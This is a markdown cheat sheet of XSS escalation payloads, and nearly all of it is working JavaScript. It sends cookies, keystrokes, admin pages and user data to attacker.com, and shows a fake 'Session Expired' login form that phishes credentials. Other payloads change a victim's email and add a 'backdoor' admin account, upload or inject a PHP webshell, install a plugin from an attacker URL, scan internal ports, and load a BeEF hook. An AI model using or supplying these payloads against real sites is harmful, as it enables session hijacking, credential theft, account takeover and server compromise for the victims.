# XSS Escalation Techniques

## Cookie Theft → Session Hijacking
```javascript
// Basic cookie theft
new Image().src='https://attacker.com/steal?c='+document.cookie;

// Fetch-based (more reliable)
fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie));

// XMLHttpRequest fallback
var x=new XMLHttpRequest();
x.open('GET','https://attacker.com/steal?c='+document.cookie);
x.send();
```

**Using stolen cookie:**
1. Open browser developer tools → Application → Cookies
2. Set stolen cookie value for the target domain
3. Refresh page — you're now logged in as the victim

**Note:** If `HttpOnly` flag is set, `document.cookie` won't include session cookies.
Pivot to other escalation methods (CSRF, credential theft).

## Credential Theft — Fake Login Form
```javascript
document.body.innerHTML = `
  <div style="max-width:400px;margin:50px auto;font-family:Arial">
    <h2>Session Expired</h2>
    <p>Please log in again to continue.</p>
    <form action="https://attacker.com/phish" method="POST">
      <input name="user" placeholder="Username" style="width:100%;padding:8px;margin:5px 0"><br>
      <input name="pass" type="password" placeholder="Password" style="width:100%;padding:8px;margin:5px 0"><br>
      <button style="width:100%;padding:10px;background:#007bff;color:white;border:none;cursor:pointer">Login</button>
    </form>
  </div>`;
```

## Keylogging
```javascript
// Log all keystrokes and send to attacker
var keys = '';
document.addEventListener('keypress', function(e) {
  keys += e.key;
  if (keys.length > 20) {
    new Image().src = 'https://attacker.com/keys?k=' + encodeURIComponent(keys);
    keys = '';
  }
});
```

## CSRF Actions (Account Takeover Path)
```javascript
// Change email → Then use password reset → Full account takeover
fetch('/api/account/email', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
});

// Add attacker as admin (if victim is admin)
fetch('/admin/api/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username: 'backdoor', password: 'pass', role: 'admin'}),
  credentials: 'include'
});
```

## XSS → RCE Chains

### Via Admin Panel File Upload
```javascript
// Upload webshell through admin's file upload
var formData = new FormData();
formData.append('file', new Blob(['<?php system($_GET["c"]); ?>'], {type:'application/x-php'}), 'shell.php');
fetch('/admin/upload', {method: 'POST', body: formData, credentials: 'include'});
```

### Via Admin Template Editor
```javascript
// Modify server-side template to include RCE
fetch('/admin/template/edit', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({template: 'header', content: '<?php system($_GET["c"]); ?>'}),
  credentials: 'include'
});
```

### Via Admin Plugin Install
```javascript
// Install malicious plugin from attacker-controlled URL
fetch('/admin/plugins/install', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url: 'https://attacker.com/evil-plugin.zip'}),
  credentials: 'include'
});
```

## Data Exfiltration via XSS
```javascript
// Read page content and send to attacker
fetch('/admin/dashboard', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: html
    });
  });

// Extract specific sensitive data
fetch('/api/users', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/data', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

## Internal Network Reconnaissance
```javascript
// Port scan internal network from victim's browser
async function scanPort(ip, port) {
  return new Promise(resolve => {
    let img = new Image();
    let start = Date.now();
    img.onload = () => resolve({ip, port, open: true});
    img.onerror = () => {
      let elapsed = Date.now() - start;
      resolve({ip, port, open: elapsed < 100}); // Fast error = port open
    };
    setTimeout(() => resolve({ip, port, open: false}), 3000);
    img.src = `http://${ip}:${port}/`;
  });
}
```

## BeEF Integration (Browser Exploitation Framework)
```html
<!-- Inject BeEF hook via XSS -->
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```
Once hooked, use BeEF modules for:
- Webcam/microphone capture
- Geolocation
- Internal network scanning
- Social engineering dialogs
- Metasploit integration for browser exploits
